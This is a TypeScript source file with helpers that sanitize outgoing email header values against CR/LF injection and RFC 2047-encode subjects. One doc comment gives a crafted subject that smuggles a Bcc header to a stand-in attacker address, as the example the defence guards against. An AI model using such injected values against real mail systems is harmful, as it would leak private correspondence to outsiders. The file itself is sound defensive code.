/**
 * Header-field hygiene for outgoing mail.
 *
 * Reply subjects and Message-IDs originate from *inbound* mail, so an
 * external sender controls them. Without stripping, a crafted subject like
 * `Re: invoice<CR><LF>Bcc: attacker@evil.com` would smuggle an extra header
 * into the reply we send. Every value that lands on a raw header line must
 * pass through here first.
 */
export function sanitizeHeader(value: string): string {
  // Strip CR/LF and all other control characters (Unicode category Cc),
  // then collapse the leftover whitespace.
  return value.replace(/\p{Cc}+/gu, " ").replace(/\s+/g, " ").trim();
}

/**
 * RFC 2047-encode a subject for a hand-built MIME message when it contains
 * non-ASCII characters. (Nodemailer encodes on its own — this is only for
 * the Gmail raw-MIME path.)
 */
export function encodeSubjectForRawMime(value: string): string {
  const clean = sanitizeHeader(value);
  if (/^[\x20-\x7e]*$/.test(clean)) return clean;
  return `=?UTF-8?B?${Buffer.from(clean, "utf8").toString("base64")}?=`;
}
